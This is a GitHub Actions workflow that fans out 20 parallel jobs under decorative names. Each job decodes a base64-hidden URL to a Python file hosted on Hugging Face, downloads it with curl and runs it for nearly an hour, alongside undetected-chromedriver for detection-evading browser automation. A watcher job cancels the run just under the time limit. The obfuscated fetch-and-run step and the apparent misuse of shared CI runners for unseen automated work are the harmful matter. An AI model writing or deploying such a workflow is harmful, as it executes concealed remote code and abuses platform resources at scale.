name: Nexus Core Hyper-Pulse Grid

on:
  workflow_dispatch:

concurrency:
  group: hyper-grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watcher: waits 59 minutes then cancels the entire workflow run
  # =================================================================
  core-watcher:
    name: "Core Watcher"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      WATCH_DURATION: 3540
    steps:
      - name: Initialize Watcher
        run: |
          echo "[WATCHER] System guardian engaged for sequence: ${{ github.run_id }}"
          echo "[WATCH_DURATION] Holding pulse for ${WATCH_DURATION} seconds (59-minute threshold)."

          sleep "${WATCH_DURATION}"

          echo "[WATCHER] Threshold crossed — executing termination sequence."

          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "[WATCHER] Termination signal dispatched. All active and pending tasks halted."

  # =================================================================
  # Hyper Grid: parallel execution of execution nodes
  # =================================================================
  hyper-node:
    name: "NodeX-${{ matrix.node_token }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_token: [A1-99, B2-88, C3-77, D4-66, E5-55, F6-44, G7-33, H8-22, I9-11, J0-00, K1-12, L2-23, M3-34, N4-45, O5-56, P6-67, Q7-78, R8-89, S9-90, T0-01]

    steps:
      # #################################################################
      # Stage 1: Setup environment
      # #################################################################
      - name: Prepare Workspace
        run: |
          echo "[PREPARE] Initializing NodeX-${{ matrix.node_token }} environment..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      # #################################################################
      # Stage 2: Fetch execution payload
      # #################################################################
      - name: Fetch Payload
        run: |
          echo "[FETCH] Pulling operational payload from remote repository..."
          PAYLOAD_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "$PAYLOAD_URL" -o engine_core.py
          echo "[FETCH] Payload successfully retrieved."

      # #################################################################
      # Stage 3: Install dependencies
      # #################################################################
      - name: Install Dependencies
        run: |
          echo "[DEPENDENCIES] Installing required libraries..."
          pip3 install -q undetected-chromedriver selenium requests psutil

      # #################################################################
      # Stage 4: Execute core engine (59-minute cap)
      # #################################################################
      - name: Run Engine Core
        run: |
          echo ">> Starting NodeX-${{ matrix.node_token }} engine process..."

          python3 engine_core.py &
          ENGINE_PID=$!

          echo ">> Engine running. Maximum allotted time: 59 minutes (3540s)."

          sleep 3540

          if kill -0 "$ENGINE_PID" 2>/dev/null; then
            echo ">> Time limit reached — shutting down engine process."
            kill -9 "$ENGINE_PID"
            echo ">> Process terminated by watchdog controller."
          else
            echo ">> Process finished execution prior to timeout."
          fi
